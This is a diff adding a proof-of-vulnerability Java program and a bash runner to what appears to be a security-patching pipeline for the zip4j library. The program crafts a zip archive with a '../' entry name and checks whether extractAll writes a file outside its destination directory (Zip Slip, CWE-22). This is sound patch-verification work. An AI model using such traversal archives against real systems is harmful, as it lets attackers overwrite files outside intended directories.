@@ -1,0 +1,121 @@
+diff --git a/.security-pipeline/pov/PovZipSlip.java b/.security-pipeline/pov/PovZipSlip.java
+new file mode 100644
+index 0000000..4842b82
+--- /dev/null
++++ b/.security-pipeline/pov/PovZipSlip.java
+@@ -0,0 +1,95 @@
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.OutputStream;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import net.lingala.zip4j.core.ZipFile;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Zip Slip / Path Traversal) in zip4j.
++ *
++ * UnzipEngine.getOutputFileNameWithPath() naively concatenates the extraction
++ * directory with the entry file name taken from the archive header:
++ *     return outPath + File.separator + fileName;
++ * A malicious archive whose entry name contains "../" therefore escapes the
++ * intended output directory when extracted with ZipFile.extractAll().
++ *
++ * This POV drives the real vulnerable code path (ZipFile.extractAll ->
++ * UnzipEngine.getOutputStream -> getOutputFileNameWithPath) using a crafted
++ * archive, then checks whether a file was written OUTSIDE the destination
++ * directory.
++ *
++ * Exit 0  => vulnerable behaviour reproduced (traversal file written outside dest).
++ * Exit 1  => traversal blocked (patched behaviour) / not reproduced.
++ */
++public class PovZipSlip {
++
++    public static void main(String[] args) throws Exception {
++        File work = new File("target/pov-zipslip");
++        deleteRecursive(work);
++        work.mkdirs();
++
++        // The "safe" sandbox that extraction is supposed to be confined to.
++        File dest = new File(work, "dest");
++        dest.mkdirs();
++
++        // Target the file we intend to plant OUTSIDE of dest (a sibling of dest).
++        File escapedTarget = new File(work, "pov_pwned.txt");
++        if (escapedTarget.exists()) {
++            escapedTarget.delete();
++        }
++
++        // Craft a malicious zip whose single entry name traverses out of dest.
++        File maliciousZip = new File(work, "malicious.zip");
++        String traversalEntryName = "../pov_pwned.txt";
++        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(maliciousZip))) {
++            ZipEntry entry = new ZipEntry(traversalEntryName);
++            zos.putNextEntry(entry);
++            zos.write("owned-by-zip-slip".getBytes("UTF-8"));
++            zos.closeEntry();
++        }
++
++        // Drive the vulnerable extraction routine through the public API.
++        try {
++            ZipFile zipFile = new ZipFile(maliciousZip.getAbsolutePath());
++            zipFile.extractAll(dest.getAbsolutePath());
++        } catch (Exception e) {
++            // A correct patch is expected to reject the traversal entry, e.g. by
++            // throwing. That is NOT the vulnerable behaviour.
++            System.out.println("[POV] extractAll threw (traversal likely blocked): " + e);
++        }
++
++        boolean escaped = escapedTarget.exists() && escapedTarget.isFile();
++        File confinedTarget = new File(dest, "pov_pwned.txt");
++
++        System.out.println("[POV] dest dir           : " + dest.getCanonicalPath());
++        System.out.println("[POV] escaped target     : " + escapedTarget.getCanonicalPath()
++                + " exists=" + escaped);
++        System.out.println("[POV] confined target    : " + confinedTarget.getCanonicalPath()
++                + " exists=" + confinedTarget.exists());
++
++        if (escaped) {
++            System.out.println("[POV] VULNERABLE: zip entry escaped the destination directory (Zip Slip).");
++            System.exit(0);
++        }
++
++        System.out.println("[POV] NOT VULNERABLE: no file was written outside the destination directory.");
++        System.exit(1);
++    }
++
++    private static void deleteRecursive(File f) {
++        if (f == null || !f.exists()) {
++            return;
++        }
++        if (f.isDirectory()) {
++            File[] kids = f.listFiles();
++            if (kids != null) {
++                for (File k : kids) {
++                    deleteRecursive(k);
++                }
++            }
++        }
++        f.delete();
++    }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..0c2d9d9
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,14 @@
++#!/usr/bin/env bash
++# POV runner for CWE-022 Zip Slip in zip4j.
++# Exits 0 when the vulnerability reproduces (traversal file written outside dest),
++# non-zero after a correct patch blocks the traversal.
++set -euo pipefail
++
++# Ensure product classes are compiled from current (patched or unpatched) source.
++mvn -B -q -DskipTests compile
++
++# Compile the POV against the freshly built product classes.
++javac -cp target/classes -d .security-pipeline/pov .security-pipeline/pov/PovZipSlip.java
++
++# Run the POV; its exit code is the POV result.
++java -cp "target/classes:.security-pipeline/pov" PovZipSlip
